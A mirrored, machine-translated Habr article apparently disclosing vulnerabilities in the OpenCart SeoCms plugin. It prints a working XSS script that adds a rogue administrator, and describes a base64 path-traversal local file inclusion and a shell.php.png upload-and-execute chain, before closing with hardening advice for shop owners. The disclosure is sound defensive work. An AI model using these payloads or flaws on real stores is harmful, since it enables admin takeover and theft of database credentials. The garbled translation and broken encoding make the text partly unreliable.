<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ§•ğŸ¾ ğŸ”ª â›¹ğŸ» Opencartforum y amigos ğŸš£ğŸ¾ ğŸ–¼ï¸ ğŸ¤˜ğŸ¼</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Todos los perros van al cielo, y todos los propietarios de tiendas en lÃ­nea en Opencart, tarde o temprano en Opencartforum. Cuando la euforia de la pr...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Opencartforum y amigos</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/466283/"><img src="https://habrastorage.org/webt/i_/fm/jp/i_fmjpfeqs4zmi1axxwqrczafv0.jpeg" alt="imagen"><br><br>  Todos los perros van al cielo, y todos los propietarios de tiendas en lÃ­nea en Opencart, tarde o temprano en Opencartforum.  Cuando la euforia de la primera instalaciÃ³n del motor en el hosting pasa y comienza la dura realidad, el dueÃ±o de la tienda tÃ­pica siempre comienza a perder algo y comienza el difÃ­cil camino de encontrar contratistas calificados y complementos de calidad para su tienda. <br><br>  El recurso mÃ¡s grande en Runet, en el que puedes encontrar ambos, es opencartforum.com, que hoy tiene mÃ¡s de 140k usuarios registrados.  De estos 140 mil registros, la mitad de ellos son personas vivas con tiendas en vivo que usan plantillas o mÃ³dulos de una forma u otra, que se pueden comprar de inmediato en el sitio.  Y todas estas personas ni siquiera se dan cuenta de que, junto con los complementos, adquieren maravillosas puertas traseras y vulnerabilidades, con las que el hacker de cualquier madre solo puede soÃ±ar. <br><a name="habracut"></a><br>  Aunque en forma declarativa en las reglas para publicar complementos en la tienda del foro, se escribe en blanco y negro.  Tenemos qadepartment, personas especialmente capacitadas revisan los complementos para detectar vulnerabilidades. <br><br>  Y ni el foro, como la plataforma que media entre el autor y el usuario final del complemento, ni los autores de los complementos, como resultaron, tienen ninguna responsabilidad. <br>  Â¿CÃ³mo es eso?  Y asi!  Al parecer histÃ³ricamente. <br><br>  Modelando por mÃ­ mismo las consecuencias hipotÃ©ticas de los incidentes, que se discutirÃ¡n mÃ¡s adelante, mi cabello en mi cabeza se eriza. <br><br>  Solo imagina.  Eres un exitoso propietario de una tienda, no has dormido por la noche en un par de aÃ±os, escribiste textos, mordisqueaste en negro, blanco, gris seo, peleaste pandas, minusinsk, no terminaste tu bebida, atrajiste 100,000 clientes, invertiste en posiciones.  Sus hijos van a un buen jardÃ­n de infantes y, de repente, sus ventas se han reducido a la mitad, simplemente porque su base con todos los contactos de los clientes fue a la competencia.  O de repente lo perdiÃ³ por completo, porque durante un mes su tienda ha estado trabajando en el servidor mysql de otra persona, y ni siquiera notÃ³ el cambio de kofig, y todas las copias de seguridad en el alojamiento se han estropeado. <br><br>  Presentaron sus sentimientos en una situaciÃ³n similar, trabajaron, trabajaron durante varios aÃ±os, y en un dÃ­a todo se acaba.  Dices que esto no puede ser asÃ­. <br><br>  Pero puede ser muy fÃ¡cil.  Â¡Basta con comprar un complemento con una "protecciÃ³n" de protecciÃ³n no declarada no declarada contra el uso no autorizado, y sus datos pueden convertirse rÃ¡pidamente en extraÃ±os! <br><br><h2>  Primer incidente </h2><br>  Hace seis meses, una tienda se evitÃ³ superficialmente cuando un informe del escÃ¡ner Ai-Bol mostrÃ³ una advertencia extraÃ±a de un cÃ³digo extraÃ±o en el mÃ³dulo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SeoCms</a> (mÃ¡s de 10,000 instalaciones activas). <br><br>  Comenzamos a mirar mÃ¡s de cerca y resultÃ³ que este abracadabra simplemente muestra la versiÃ³n del complemento: <br><br><pre><code class="php hljs">$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_reda eh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh _stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($date_diff &gt; <span class="hljs-number"><span class="hljs-number">7</span></span>) { $ver_content = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $opts = <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>( $text_ptth =&gt; <span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_dohtem =&gt;$text_tsop, $redaeh =&gt;$text_redaeh_stpo, $tnetnoc =&gt; $yreuq_dliub_ptth(<span class="hljs-keyword"><span class="hljs-keyword">array</span></span>($text_rdda =&gt;$value_rdda, $text_liame =&gt; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'liame'</span></span>], $text_rev=&gt;<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;data[<span class="hljs-string"><span class="hljs-string">'blog_version'</span></span>] )))); $context = $etaerc_txetnoc_maerts($opts); $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ver_content = $stnetnoc_teg_elif($rev_knil, <span class="hljs-keyword"><span class="hljs-keyword">FALSE</span></span> , $context); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { <span class="hljs-comment"><span class="hljs-comment">//echo "Warning or better raised: " . $e-&gt;getMessage(); } $this-&gt;model_setting_setting-&gt;editSetting('blog_ver', Array('blog_version_date' =&gt; $date_current, 'blog_version_content' =&gt; $ver_content )); } if ($this-&gt;data['blog_version']!=$ver_content) { $this-&gt;data['text_new_version'] = $this-&gt;language-&gt;get('text_new_version').$ver_content. " &lt;span style='color: #000; font-weight: normal;'&gt;(".$date_ver_update.")&lt;/span&gt;". $this-&gt;language-&gt;get('text_new_version_end'); } else { $this-&gt;data['text_new_version'] = ''; }</span></span></code> </pre> <br>  EstÃ¡ bien, excepto que: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;language-&gt;get(<span class="hljs-string"><span class="hljs-string">'text_new_version'</span></span>).$ver_content. <span class="hljs-string"><span class="hljs-string">" &lt;span style='color: #000; font-weight: normal;'&gt;("</span></span>.$date_ver_update.<span class="hljs-string"><span class="hljs-string">")&lt;/span&gt;"</span></span></code> </pre><br>  no se filtra de ninguna manera, y si por accidente aparece un script como el siguiente en lugar de la versiÃ³n del cliente, obtener acceso de administrador a cualquier tienda donde estÃ© instalado el mÃ³dulo es cuestiÃ³n de tiempo y tÃ©cnica. <br><br><pre> <code class="php hljs">&lt;script&gt; <span class="hljs-comment"><span class="hljs-comment">// shell sample // seocms the best architectural mistake forever // i got all your 10 000 shops // i install 10 000 backdors functionâ€‹ getUrlVarsâ€‹()â€‹ {â€‹ vâ€‹arâ€‹vars=â€‹â€‹[â€‹],â€‹hash,â€‹â€‹hashes=â€‹â€‹nâ€‹ull;â€‹ iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.iâ€‹ndexOf(â€‹"â€‹?"â€‹)â€‹â€‹&amp;&amp; windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹indexOfâ€‹("â€‹&amp;")â€‹)â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.lâ€‹ocationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+ 1)â€‹.â€‹split(â€‹â€‹"&amp;"â€‹); }â€‹â€‹â€‹elseâ€‹iâ€‹fâ€‹â€‹(wâ€‹indowâ€‹.lâ€‹ocation.â€‹hâ€‹refâ€‹.â€‹indexOf(â€‹â€‹"?"â€‹))â€‹â€‹{ hashes =â€‹ windowâ€‹.â€‹location.â€‹hâ€‹ref.â€‹â€‹sliceâ€‹(wâ€‹indowâ€‹.â€‹locationâ€‹.hâ€‹refâ€‹.iâ€‹ndexOfâ€‹(â€‹"?"â€‹)â€‹â€‹+â€‹â€‹1â€‹); }â€‹ iâ€‹fâ€‹ â€‹(hâ€‹ashes!â€‹=â€‹nâ€‹ull)â€‹ â€‹{â€‹ fâ€‹orâ€‹â€‹(vâ€‹arâ€‹iâ€‹=â€‹â€‹0;â€‹â€‹iâ€‹&lt;â€‹hashesâ€‹.â€‹lengthâ€‹;â€‹iâ€‹++)â€‹{â€‹ hash=â€‹â€‹hashes[â€‹â€‹i]â€‹.sâ€‹plitâ€‹(â€‹"=")â€‹; vars[â€‹hâ€‹ashâ€‹[0â€‹]â€‹]â€‹â€‹=â€‹hashâ€‹[â€‹1]â€‹; }â€‹ }â€‹ râ€‹eturnâ€‹vars;â€‹ } varâ€‹ url_vars =â€‹ â€‹ getUrlVarsâ€‹(); varâ€‹ token =â€‹ â€‹ url_vars.â€‹ â€‹tokenâ€‹; varâ€‹ host â€‹=â€‹ window.â€‹ â€‹locationâ€‹.â€‹origin;â€‹ varâ€‹action=â€‹â€‹host+â€‹â€‹"â€‹/admin/index.php?route=user/user/add&amp;token="â€‹+â€‹ token;â€‹ document.â€‹ â€‹addEventListenerâ€‹(â€‹"DOMContentLoaded"â€‹,â€‹ â€‹functionâ€‹(â€‹eventâ€‹)â€‹ â€‹{ $â€‹.pâ€‹ost(â€‹â€‹action,â€‹â€‹{â€‹â€‹usernameâ€‹:â€‹â€‹"Hack123"â€‹,â€‹user_group_idâ€‹:â€‹â€‹"1"â€‹, firstnameâ€‹:â€‹"â€‹Lol",â€‹â€‹lastnameâ€‹:â€‹"â€‹Haha"â€‹,â€‹ emailâ€‹:â€‹â€‹"Hack123@Hack123.com"â€‹, password:â€‹â€‹"â€‹1234",â€‹â€‹ confirmâ€‹:â€‹â€‹"1234"â€‹,â€‹ statusâ€‹:â€‹â€‹"1"â€‹â€‹}â€‹â€‹); }); &lt;/script&gt;</span></span></code> </pre><br>  Los detalles de la situaciÃ³n se describen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquÃ­</a> .  Aviso de administraciÃ³n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">aquÃ­</a> . <br><br>  Probablemente la quinta vez, despuÃ©s de haber modelado este proceso muy claramente para la administraciÃ³n del foro, fue posible transmitir la crÃ­tica de la situaciÃ³n. <br><br>  Y la administraciÃ³n, a su vez, notificÃ³ oficialmente a los usuarios la presencia de esta vulnerabilidad, y parece que incluso hizo un boletÃ­n informativo a los clientes.  Pero esto no es exacto. <br><br>  Dejemos detrÃ¡s de escena las amenazas y evasiones del autor del complemento y sigamos adelante por dos meses mÃ¡s ... <br><br><h2>  Segundo incidente </h2><br>  Otra tienda viene para inspecciÃ³n, en la que hay frisos salvajes de hasta 3-4 segundos en cada pÃ¡gina.  Comenzamos a diseccionar y ver en la carpeta con un cachÃ© de mÃ¡s de 20k archivos con la extensiÃ³n .php.  CachÃ© de archivos con la extensiÃ³n php Karl, Â¡no es casualidad! <br><br>  Examinamos la estructura de datos de estos archivos, y nuevamente hay piezas de nuestro hermoso mÃ³dulo SEOCMS. <br><br>  Y un gran mÃ©todo: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $ajax_file = DIR_CACHE.base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">"ajax_file"</span></span>])); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; }</code> </pre> <br>  Este es un ejemplo de una vulnerabilidad clÃ¡sica: la inclusiÃ³n de archivos locales. <br><br>  Es suficiente codificar en base64 ../....../config.php y hello - require ($ ajax_file);  Y por favor: aquÃ­ tiene las contraseÃ±as de la base de datos, y aquÃ­ estÃ¡ el registro de errores del sistema, y â€‹â€‹si incluso / etc / pwd es muy necesario, aunque ha sido irrelevante durante mucho tiempo, Â¿y si? <br><br>  Â¿Y cuÃ¡ntos servidores y servidores con configuraciÃ³n predeterminada brillan en el mundo de phpmyadmin?  Mitad?  MÃ¡s? <br><br>  Comenzamos a buscar mÃ¡s y Â¿quÃ© encontramos?  Maravilloso cÃ³digo de descarga de avatar: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!$json) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (is_uploaded_file(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>]) &amp;&amp; file_exists(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;files[<span class="hljs-string"><span class="hljs-string">'file'</span></span>][<span class="hljs-string"><span class="hljs-string">'tmp_name'</span></span>])) { $file = basename($filename) . <span class="hljs-string"><span class="hljs-string">'.'</span></span> . md5(substr(sha1(uniqid(mt_rand(), <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>)), <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">10</span></span>)); $file_original = basename($filename); <span class="hljs-comment"><span class="hljs-comment">// Hide the uploaded file name so people can not link to it directly. //$json['file'] = $this-&gt;encryption-&gt;encrypt($file); // To remove highload from the file system, when large number of buyers $avatar_dir = 'data/avatars/'.(ceil ($this-&gt;data['customer_id'] / 300)) * 300; move_uploaded_file($this-&gt;request-&gt;files['file']['tmp_name'], DIR_IMAGE . $file); $new_filename = $avatar_dir.'/'.$this-&gt;data['customer_id']."_".utf8_strtolower($file_original); if (isset($this-&gt;data['thislist']['avatar_width']) &amp;&amp; $this-&gt;data['thislist']['avatar_width']!='') { $width = $this-&gt;data['thislist']['avatar_width']; } else { if (isset($this-&gt;data['generallist']['avatar_width']) &amp;&amp; $this-&gt;data['generallist']['avatar_width']!='') { $width = $this-&gt;data['generallist']['avatar_width']; } else { $width = '100'; } } if (isset($this-&gt;data['thislist']['avatar_height']) &amp;&amp; $this-&gt;data['thislist']['avatar_height']!='') { $height = $this-&gt;data['thislist']['avatar_height']; } else { if (isset($this-&gt;data['generallist']['avatar_height']) &amp;&amp; $this-&gt;data['generallist']['avatar_height']!='') { $height = $this-&gt;data['generallist']['avatar_height']; } else { $height = '100'; } } $this-&gt;load-&gt;model('tool/image'); $json['file'] = $avatar_thumb = $this-&gt;model_tool_image-&gt;resizeavatar($file, $new_filename , $width, $height, true, false); if (trim($avatar_thumb)=='') { $json['error'] = $this-&gt;language-&gt;get('error_upload'); } if ($file!='' &amp;&amp; file_exists(DIR_IMAGE . $file)) { unlink (DIR_IMAGE . $file); } } }</span></span></code> </pre> <br>  Lo cual cae perfectamente en el error al intentar cambiar el tamaÃ±o (y nos muestra la ruta completa al archivo descargado), despuÃ©s de cargar algÃºn tipo de shell.php.png, y luego tambiÃ©n se ejecuta perfectamente por el mÃ©todo anterior. <br><br>  Video de explotaciÃ³n de vulnerabilidad (con la salida de error del sistema php activada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/SdyW8OzAfZI" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  Video de explotaciÃ³n de vulnerabilidad (con la salida de error del sistema php desactivada): <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/f-JYKzT_WAk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  El anÃ¡lisis del cÃ³digo se realizÃ³ en la versiÃ³n del mÃ³dulo 52 en abril de 2019. <br><br>  Dado que tanto el autor como la administraciÃ³n del foro fueron notificados en las mismas fechas, pasÃ³ suficiente tiempo para que tomen todas las medidas posibles para notificar a los compradores sobre la eliminaciÃ³n de vulnerabilidades, nosotros, con la conciencia tranquila, podemos revelar todos los detalles. <br><br>  Y en ese momento, algo sucediÃ³.  En el servidor del desarrollador estaba su propio mÃ³dulo.  Pero la vulnerabilidad no funcionÃ³ en eso.  Estaba cubierta ... Y esto es una gran rareza.  Muy grande !!! <br><br>  Y la segunda rareza de toda esta historia es que el foro abierto en la persona de la administraciÃ³n y el departamento de control de calidad de complementos no vio ni el primer ni el segundo incidente, y en ambos casos en la primera notificaciÃ³n no encontrÃ³ nada crÃ­tico. <br><br>  Por supuesto, no hay nada crÃ­tico cuando tus configuraciones brillan en el mundo.  No hay nada crÃ­tico cuando una buena mitad de los comerciantes desconocen lo que sucede debajo de su capÃ³.  DespuÃ©s de todo, una vez, alguien puso este complemento, y sin enviar por correo, ni siquiera se dan cuenta de que todo el negocio estÃ¡ bajo amenaza directa. <br><br>  Y si hubo una reacciÃ³n distinta de la administraciÃ³n en el primer incidente, en el segundo se eliminan todas las publicaciones con una menciÃ³n.  Y todo esto estÃ¡ cubierto por una <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">oferta de foro</a> , segÃºn la cual, sobre adiciones comerciales, se pueden dejar comentarios sobre los muertos, ya sea bueno o nada. <br><br>  El autor tambiÃ©n afirma que los errores y los agujeros estÃ¡n arreglados, qadepartment perdiÃ³ el complemento para la venta, pero no, los agujeros no estÃ¡n arreglados ... <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ajax_file</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!class_exists(<span class="hljs-string"><span class="hljs-string">'PHP_Exceptionizer'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (function_exists(<span class="hljs-string"><span class="hljs-string">'modification'</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(modification(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>)); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">require_once</span></span>(DIR_SYSTEM . <span class="hljs-string"><span class="hljs-string">'library/exceptionizer.php'</span></span>); } } $exceptionizer = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> PHP_Exceptionizer(E_ALL); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; $filename = preg_replace(<span class="hljs-string"><span class="hljs-string">'/[^a-zA-Z0-9\.\-\s+]/'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>, html_entity_decode(base64_decode(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;db-&gt;escape(<span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;request-&gt;get[<span class="hljs-string"><span class="hljs-string">'ajax_file'</span></span>])), ENT_QUOTES, <span class="hljs-string"><span class="hljs-string">'UTF-8'</span></span>)); $ajax_file = DIR_CACHE . $filename; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!file_exists($ajax_file)) { $ajax_file_cached = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { ob_start(); <span class="hljs-keyword"><span class="hljs-keyword">require</span></span>($ajax_file); $ajax_html = ob_get_contents(); ob_end_clean(); header(<span class="hljs-string"><span class="hljs-string">'Content-type: text/html; charset=utf-8'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $ajax_html; <span class="hljs-keyword"><span class="hljs-keyword">$this</span></span>-&gt;deletecache(<span class="hljs-string"><span class="hljs-string">'cache.ajax'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">exit</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> $ajax_file_cached; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (E_WARNING $e) { } }</code> </pre> <br>  require () todavÃ­a estÃ¡ aquÃ­.  La entrada estÃ¡ ligeramente filtrada.  Pero el potencial LFI viviÃ³ y viviÃ³.  Si un poco mÃ¡s, entonces sÃ­, ahora no podemos cargar ni ejecutar el shell.  Pero supongamos que intentamos, cerramos, cementamos la ejecuciÃ³n de cualquier script excepto index.php, e incluso en el nivel de configuraciÃ³n nginx, al que de ninguna manera se puede acceder.  Pero en otro lugar, el hacker malvado tuvo la oportunidad de poner un archivo arbitrario en la carpeta de cachÃ©.  Que va a pasar  AsÃ­ es: para ejecutar cÃ³digo extraÃ±o, generando un hash en la solicitud de obtenciÃ³n, lleva dos minutos.  Es decir, al final resulta que estÃ¡ un poco cerrado, pero no estÃ¡ completamente. <br><br>  Bueno, las pequeÃ±as cosas: cÃ³mo brillaban esas relaciones tan hermosas en los archivos de idioma: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ((<span class="hljs-keyword"><span class="hljs-keyword">isset</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span> || $_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTPS'</span></span>] == <span class="hljs-string"><span class="hljs-string">'1'</span></span>)) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) &amp;&amp; (strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_PROTO'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'https'</span></span>) || (!<span class="hljs-keyword"><span class="hljs-keyword">empty</span></span>($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) &amp;&amp; strtolower($_SERVER[<span class="hljs-string"><span class="hljs-string">'HTTP_X_FORWARDED_SSL'</span></span>]) == <span class="hljs-string"><span class="hljs-string">'on'</span></span>))) { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTPS_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTPS_CATALOG; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { $_[<span class="hljs-string"><span class="hljs-string">'value_revres'</span></span>] = HTTP_SERVER; $_[<span class="hljs-string"><span class="hljs-string">'value_ctlg'</span></span>] = HTTP_CATALOG; }</code> </pre> <br>  Y brillan ... Desea conocer el camino completo a la raÃ­z del proyecto.  Simplemente encuentre la tienda con la pantalla de error activada y ejecute el enlace directamente al archivo de idioma. <br><br>  Para estudiar quÃ© mÃ¡s puede ser despuÃ©s de actualizar el complemento en megabytes de lÃ­neas de cÃ³digo del autor, no hay recursos ni deseo.  Hay personas responsables especialmente capacitadas para esto. <br><br>  Y la guinda del pastel.  Recordamos que tenemos un complemento comercial ... Y en un complemento comercial tenemos texto oculto en el recurso del autor: <br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.google.com/search?q=%22Powered+by+SEO+CMS%22</a> </blockquote><br>  Curiosamente, Â¿al menos uno de los compradores de complementos conoce un huevo de pascua tan "maravilloso"? <br><br>  Hoy, el suplemento se vende y se vende.  Las publicaciones con llamadas para prestar atenciÃ³n a la situaciÃ³n simplemente se eliminan.  Ninguno de los compradores recibiÃ³ notificaciones de advertencia sobre el segundo incidente.  QuizÃ¡s el 20-30% de los usuarios de complementos han actualizado, pero el 70%, incluso si hablamos de las estadÃ­sticas del autor oficial sobre el uso de complementos, se trata de 7000 tiendas (de hecho, mÃ¡s, ya que nadie sabe con seguridad cuÃ¡ntas copias instalaron los freelancers en las tiendas de los clientes). licencia extendida) estÃ¡n en una gran zona de riesgo. <br><br>  En palabras del barÃ³n Munchausen, solo quiero decir una cosa: Â¡Caballeros actualizados! <br><br><h2>  Para los clientes </h2><br>  QuÃ© hacer, los que terminaron en este submarino que se hunde: <br><br><ul><li>  No deje basura en ftp.  Ver info.php, adminer.php y toda la otra basura.  Solo debes tener index.php y un punto. </li><li>  Cambie regularmente las contraseÃ±as, todas las contraseÃ±as (ftp, panel de administraciÃ³n, base de datos).  Y asegÃºrese de no tener accidentalmente cuentas extra extraÃ±as. </li><li>  Desactivar salida de error.  Siempre, si no trabaja, apague la salida de error en el nivel de configuraciÃ³n del intÃ©rprete y no en la configuraciÃ³n de la tienda. </li><li>  SÃ­, sÃ© que esto no es muy factible, pero al menos debe mantenerse actualizado con las actualizaciones del cÃ³digo del motor relacionadas con la seguridad e, idealmente, actualizar regularmente el motor a versiones estables. </li><li>  Mire regularmente los registros de visitas, puede haber muchas cosas interesantes.  Rastrea anomalÃ­as. </li><li>  Cierre adicionalmente con una contraseÃ±a o restricciÃ³n en el administrador de IP de la tienda y varias secciones vulnerables, como phpmyadmin.  Si este es un intercambio en el que phpmyadmin es comÃºn para todos, Â¡huya de ese alojamiento! </li><li>  Si usa sxd y utilidades similares, cambie el nombre de inmediato a un conjunto de caracteres aleatorio. </li><li>  Al usar nginx, vale la pena agregar reglas a la configuraciÃ³n del host virtual que prohÃ­ban ejecutar cualquier script php que no sea index.php en las secciones raÃ­z y de administraciÃ³n del sitio. </li><li>  No tires basura de tu cuenta.  Si tienes una tienda, deja que sea una tienda.  No cargue bajo una cuenta un montÃ³n de wp-blogs, un montÃ³n de errores y varios dominios de prueba. </li><li>  Nunca almacene copias de seguridad de un sitio o base de datos en la raÃ­z de su host virtual. </li><li>  Observe la carga en el servidor / alojamiento, intente mantener el suministro al menos x2 de las cargas mÃ¡ximas, y si de repente la carga aumenta repentinamente sin razÃ³n, intente averiguar la razÃ³n.  Â¡Es mejor adelantar que no adelantar! </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/466283/">https://habr.com/ru/post/466283/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../466263/index.html">Sistemas RPC de referencia (y Json invertido)</a></li>
<li><a href="../466267/index.html">Â¿Por quÃ© muchos subestiman sus juegos?</a></li>
<li><a href="../466271/index.html">Cursos conjuntos Grupo-IB y Belkasoft: quÃ© enseÃ±amos y a quiÃ©n acudir</a></li>
<li><a href="../466279/index.html">La mayorÃ­a de los dispositivos Android son vulnerables a los ataques de phishing a travÃ©s de SMS</a></li>
<li><a href="../466281/index.html">Realidad virtual, juegos de cÃ³digo abierto y autos elÃ©ctricos: lo que dijo John Carmack en el podcast Joe Rogan</a></li>
<li><a href="../466285/index.html">Un pequeÃ±o regalo de promociÃ³n: combo de rifa dvr y detector de radar</a></li>
